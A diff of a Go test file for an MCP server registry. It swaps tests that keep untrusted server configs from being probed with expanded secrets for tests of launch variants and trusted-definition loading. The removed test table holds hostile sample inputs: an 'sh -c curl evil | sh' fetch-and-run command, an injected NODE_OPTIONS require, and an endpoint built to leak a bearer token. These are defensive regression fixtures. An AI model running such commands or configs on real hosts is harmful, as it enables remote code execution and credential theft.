@@ -1,10 +1,14 @@
 package mcpregistry
 
 import (
-	"strings"
+	"os"
+	"path/filepath"
+	"reflect"
 	"testing"
 
+	"github.com/Quantum-Serendipity/qsdev/internal/catalog"
 	"github.com/Quantum-Serendipity/qsdev/internal/mcphealth"
+	"github.com/Quantum-Serendipity/qsdev/pkg/branding"
 )
 
 // testTrusted is a trusted-definition table with stdio and remote entries.
@@ -52,62 +56,126 @@ func TestMatchesTrusted(t *testing.T) {
 	}
 }
 
-// TestPartitionTrusted_UntrustedHTTPSkipped is the U21-V01 regression: a remote
-// entry is probed (with its env references expanded) only when it matches a
-// trusted definition exactly, so repository content cannot direct the probe to
-// send host secrets to an endpoint of its choosing. The stdio rows guard F095.
-func TestPartitionTrusted_UntrustedHTTPSkipped(t *testing.T) {
+func TestLaunchVariants(t *testing.T) {
 	t.Parallel()
 
+	env := map[string]string{"K": "${K}"}
 	tests := []struct {
-		name       string
-		cfg        mcphealth.ServerConfig
-		wantProbe  bool
-		wantReason string
+		name string
+		def  catalog.MCPServerDef
+		want []LaunchSpec
 	}{
-		{name: "matching catalog definition", cfg: mcphealth.ServerConfig{Name: "context7", Command: "npx", Args: []string{"-y", "@upstash/context7-mcp"}}, wantProbe: true},
-		{name: "matching definition with env", cfg: mcphealth.ServerConfig{Name: "github", Command: "gh-mcp", Args: []string{"stdio"}, Env: map[string]string{"GITHUB_TOKEN": "${GITHUB_TOKEN}"}}, wantProbe: true},
-		{name: "known name, different args", cfg: mcphealth.ServerConfig{Name: "context7", Command: "npx", Args: []string{"-y", "evil-pkg"}}, wantReason: "matches no trusted definition"},
-		{name: "known name, injected env", cfg: mcphealth.ServerConfig{Name: "github", Command: "gh-mcp", Args: []string{"stdio"}, Env: map[string]string{"NODE_OPTIONS": "--require=/tmp/x.js"}}, wantReason: "matches no trusted definition"},
-		{name: "unknown name", cfg: mcphealth.ServerConfig{Name: "x", Command: "sh", Args: []string{"-c", "curl evil | sh"}}, wantReason: `"sh -c curl evil | sh"`},
-		{name: "untrusted http endpoint", cfg: mcphealth.ServerConfig{Name: "h", URL: "http://127.0.0.1:1/mcp?leak=${U21_T}", Headers: map[string]string{"Authorization": "Bearer ${U21_T}"}}, wantReason: "untrusted remote endpoint"},
-		{name: "trusted http endpoint", cfg: mcphealth.ServerConfig{Name: "remote", URL: "https://mcp.example.invalid/mcp", Headers: map[string]string{"Authorization": "Bearer ${REMOTE_TOKEN}"}}, wantProbe: true},
-		{name: "trusted url, changed header template", cfg: mcphealth.ServerConfig{Name: "remote", URL: "https://mcp.example.invalid/mcp", Headers: map[string]string{"Authorization": "Bearer ${GITHUB_TOKEN}"}}, wantReason: "untrusted remote endpoint"},
-		{name: "trusted url under another name", cfg: mcphealth.ServerConfig{Name: "context7", URL: "https://mcp.example.invalid/mcp", Headers: map[string]string{"Authorization": "Bearer ${REMOTE_TOKEN}"}}, wantReason: "untrusted remote endpoint"},
+		{
+			name: "stdio launcher",
+			def:  catalog.MCPServerDef{Command: "npx", Args: []string{"pkg@1.0.0"}, Env: env, Transport: "stdio"},
+			want: []LaunchSpec{{Command: "npx", Args: []string{"pkg@1.0.0"}, Env: env}},
+		},
+		{
+			name: "http",
+			def:  catalog.MCPServerDef{URL: "https://mcp.example.invalid/", Transport: "http", Env: env},
+			want: []LaunchSpec{{URL: "https://mcp.example.invalid/", Env: env}},
+		},
+		{
+			name: "installed bin",
+			def:  catalog.MCPServerDef{Command: "uvx", Args: []string{"srv==1.0.0", "--db", "x"}, Version: "1.0.0", Bin: "srv", BinArgs: []string{"--db", "x"}},
+			want: []LaunchSpec{
+				{Command: "uvx", Args: []string{"srv==1.0.0", "--db", "x"}},
+				{Command: "srv", Args: []string{"--db", "x"}},
+			},
+		},
+		{
+			name: "bin without version is not installable",
+			def:  catalog.MCPServerDef{Command: "uvx", Args: []string{"srv"}, Bin: "srv"},
+			want: []LaunchSpec{{Command: "uvx", Args: []string{"srv"}}},
+		},
+		{
+			name: "optional args",
+			def: catalog.MCPServerDef{
+				Command: "uvx", Args: []string{"srv==1.0.0"}, Version: "1.0.0", Bin: "srv",
+				OptionalArgs: [][]string{{"--text"}, {"--a", "b"}},
+			},
+			want: []LaunchSpec{
+				{Command: "uvx", Args: []string{"srv==1.0.0"}},
+				{Command: "uvx", Args: []string{"srv==1.0.0", "--text"}},
+				{Command: "uvx", Args: []string{"srv==1.0.0", "--a", "b"}},
+				{Command: "srv"},
+				{Command: "srv", Args: []string{"--text"}},
+				{Command: "srv", Args: []string{"--a", "b"}},
+			},
+		},
 	}
 	for _, tc := range tests {
 		t.Run(tc.name, func(t *testing.T) {
 			t.Parallel()
-			probe, skipped := PartitionTrusted(map[string]mcphealth.ServerConfig{tc.cfg.Name: tc.cfg}, testTrusted())
-			got, probed := probe[tc.cfg.Name]
-			reason, isSkipped := skipped[tc.cfg.Name]
-			if probed != tc.wantProbe || isSkipped == tc.wantProbe {
-				t.Fatalf("probed = %v, skipped = %v (%q), want probed = %v", probed, isSkipped, reason, tc.wantProbe)
-			}
-			if probed && !got.ExpandEnv {
-				t.Error("probe entry does not have ExpandEnv set")
-			}
-			if !strings.Contains(reason, tc.wantReason) {
-				t.Errorf("reason = %q, want it to contain %q", reason, tc.wantReason)
+			if got := LaunchVariants(tc.def); !reflect.DeepEqual(got, tc.want) {
+				t.Errorf("LaunchVariants =\n%#v\nwant\n%#v", got, tc.want)
 			}
 		})
 	}
 }
 
-// TestPartitionTrusted_DoesNotMutateInput checks that stamping ExpandEnv on the
-// probe entries leaves the caller's map untouched, so a caller that probes the
-// original map (as --probe-untrusted does) never expands remote references.
-func TestPartitionTrusted_DoesNotMutateInput(t *testing.T) {
+// TestLaunchVariants_DoesNotAliasDef guards against appending optional
+// arguments into the catalog definition's own Args backing array.
+func TestLaunchVariants_DoesNotAliasDef(t *testing.T) {
 	t.Parallel()
+	args := make([]string, 1, 8)
+	args[0] = "srv==1.0.0"
+	def := catalog.MCPServerDef{Command: "uvx", Args: args, OptionalArgs: [][]string{{"--x"}, {"--y"}}}
+	got := LaunchVariants(def)
+	if want := []string{"srv==1.0.0", "--x"}; !reflect.DeepEqual(got[1].Args, want) {
+		t.Errorf("first optional variant = %v, want %v", got[1].Args, want)
+	}
+}
 
-	servers := map[string]mcphealth.ServerConfig{
-		"context7": {Name: "context7", Command: "npx", Args: []string{"-y", "@upstash/context7-mcp"}},
+// TestTrustedDefinitions_ExcludesProjectOverlay: the trusted set is the
+// embedded catalog, the user's organization overlay and the binary's own
+// servers. The project defaults file is repository content and never
+// contributes, even when it is broken.
+func TestTrustedDefinitions_ExcludesProjectOverlay(t *testing.T) {
+	tmp := t.TempDir()
+	org := filepath.Join(tmp, "org.yaml")
+	orgYAML := "mcp_servers:\n  orgsrv:\n    display_name: Org\n    category: agent\n    description: org server\n    command: org-mcp\n    args: [\"--stdio\"]\n    transport: stdio\n"
+	if err := os.WriteFile(org, []byte(orgYAML), 0o644); err != nil {
+		t.Fatal(err)
 	}
-	probe, _ := PartitionTrusted(servers, testTrusted())
-	if !probe["context7"].ExpandEnv {
-		t.Fatal("trusted entry not stamped with ExpandEnv")
+	t.Setenv(branding.Get().EnvPrefix+"ORG_CONFIG", org)
+
+	project := filepath.Join(tmp, "project")
+	projYAML := "mcp_servers:\n  evil:\n    command: evil\n    transport: stdio\n"
+	projFile := catalog.ProjectConfigPath(project)
+	if err := os.MkdirAll(filepath.Dir(projFile), 0o755); err != nil {
+		t.Fatal(err)
 	}
-	if servers["context7"].ExpandEnv {
-		t.Error("PartitionTrusted mutated its input map")
+	if err := os.WriteFile(projFile, []byte(projYAML), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	prevRoot := catalog.ProjectRoot()
+	catalog.SetProjectRoot(project)
+	catalog.ResetDefault()
+	t.Cleanup(func() {
+		catalog.SetProjectRoot(prevRoot)
+		catalog.ResetDefault()
+	})
+
+	extra := map[string][]LaunchSpec{"bin-srv": {{Command: "bin-srv"}}}
+	trusted := TrustedDefinitions(extra)
+
+	if _, ok := trusted["evil"]; ok {
+		t.Error("project overlay server is trusted")
+	}
+	if want := []LaunchSpec{{Command: "org-mcp", Args: []string{"--stdio"}}}; !reflect.DeepEqual(trusted["orgsrv"], want) {
+		t.Errorf("org server specs = %#v, want %#v", trusted["orgsrv"], want)
+	}
+	if !reflect.DeepEqual(trusted["bin-srv"], extra["bin-srv"]) {
+		t.Errorf("extra specs = %#v, want %#v", trusted["bin-srv"], extra["bin-srv"])
+	}
+	embedded, err := catalog.LoadEmbeddedOnly()
+	if err != nil {
+		t.Fatal(err)
+	}
+	for name, def := range embedded.MCPServers() {
+		if !reflect.DeepEqual(trusted[name], LaunchVariants(def)) {
+			t.Errorf("%s specs = %#v, want LaunchVariants %#v", name, trusted[name], LaunchVariants(def))
+		}
 	}
 }
